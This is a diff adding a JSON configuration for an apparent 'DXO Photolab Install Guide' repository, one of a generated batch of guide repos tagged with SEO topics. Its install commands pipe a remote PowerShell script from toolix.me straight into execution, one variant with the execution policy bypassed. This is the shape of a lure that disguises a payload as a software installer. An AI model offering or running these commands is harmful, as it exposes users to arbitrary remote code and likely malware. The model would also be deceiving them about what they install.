@@ -1,0 +1,27 @@
+{
+  "repo": "DXO-Photolab-Install-Guide",
+  "product": "DXO Photolab Install Guide",
+  "product_title": "DXO Photolab Install Guide",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-dxo-photolab-install-guide",
+    "dxo-photolab-install-guide-app",
+    "design-software",
+    "image-editing",
+    "creative-workflow",
+    "visual-design",
+    "dxo-photolab-install-guide-creative-tool",
+    "dxo-photolab-install-guide-design-tool",
+    "dxo-photolab-install-guide",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
